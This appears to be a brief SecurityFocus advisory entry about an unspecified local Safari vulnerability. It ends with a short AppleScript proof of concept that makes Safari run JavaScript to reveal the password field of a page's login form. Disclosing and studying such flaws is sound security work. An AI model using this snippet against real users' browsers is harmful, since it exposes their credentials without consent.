source: http://www.securityfocus.com/bid/23825/info

Apple Safari is prone to an unspecified local vulnerability.

Few technical details are currently available. We will update this BID as more information emerges. 

tell application "Safari"
        do JavaScript "alert(document.loginform.password.value)" in document 1
end tell
